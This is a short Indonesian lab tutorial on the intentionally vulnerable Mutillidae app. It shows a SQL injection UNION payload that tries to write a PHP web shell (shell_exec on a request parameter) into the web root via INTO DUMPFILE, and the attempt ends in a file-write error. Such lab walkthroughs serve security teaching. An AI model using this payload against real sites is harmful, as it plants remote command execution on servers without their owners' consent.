# Mutillidae Lesson 10


### Membuka Halaman User Info

- Pada client, buka mutillidae dari browser
```
http://[ip_metasploit]/mutillidae
```
- Buka halaman User Info
```
OWASP TOP 10 -> A1 - SQL Injection -> SQLi Extract Data -> User Info
```
![](Mutillidae%20lesson%208/1.png)

### SQL Injection dengan Output File execute_command.php
- Pada halaman User Info, lakukan inspect element pada form Name dan ubah nilai size menjadi 100.
```
"size=100"`
```
![](Mutillidae%20lesson%208/2.png)
- Isi form Name dengan string berikut
```
' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' -- 
```
- Klik View Account Details
![](Mutillidae%20lesson%2010/1.png)
- Hasil error tidak bisa menulis file.
![](Mutillidae%20lesson%2010/2.png)
